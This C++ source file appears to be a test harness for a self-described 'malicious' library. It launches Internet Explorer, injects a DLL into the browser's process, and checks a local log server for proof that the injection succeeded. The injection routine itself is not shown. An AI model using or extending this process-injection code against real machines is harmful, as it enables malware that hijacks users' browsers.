#include <common/Log.hpp>
#include <common/LogServer.hpp>
using namespace Common;

#include <malicious/InternetExplorer.hpp>
#include <malicious/Injector.hpp>
#include <malicious/Exception.hpp>

#include <system/ThisProcess.hpp>
using namespace System;

int main(int argc, char * argv[])
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	LOG_THIS_FUNCTION
	try
	{
		LOG.setHeader("TEST INJECTION");
		LOG.trace();
        LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
		LOG.addObserver(new Common::LogToConsole);

		ThisProcess thisProcess;

		/*
		// Chargement normal de la DLL
		HMODULE hModule = LoadLibrary("dll.dll");
		Sleep(INFINITE);
		*/
		LogServer logServer(8000, "INJECTED");
		
		logServer.start();

        Malicious::InternetExplorer ie(true);
		std::string dllPath = thisProcess.getProgramDir()+"\\dll.dll";
		LOG << "Injecting "+dllPath;
        if(!Malicious::inject(ie.getPid(), dllPath))
        {
			LOG << "Injection failed";
			return EXIT_FAILURE;
		}
		LOG << "Waiting for injection proof...";
		Sleep(1000);
		logServer.stop();
		if(logServer.isProofReceived())
		{
			LOG << "Log server well interrupted";
			return EXIT_SUCCESS;
		}
    }
    catch(std::exception& e)
    {
        LOG << e.what();
    }
	catch(...)
	{
		LOG << "Unknow exception from injection main";
	}
	return EXIT_FAILURE;
}
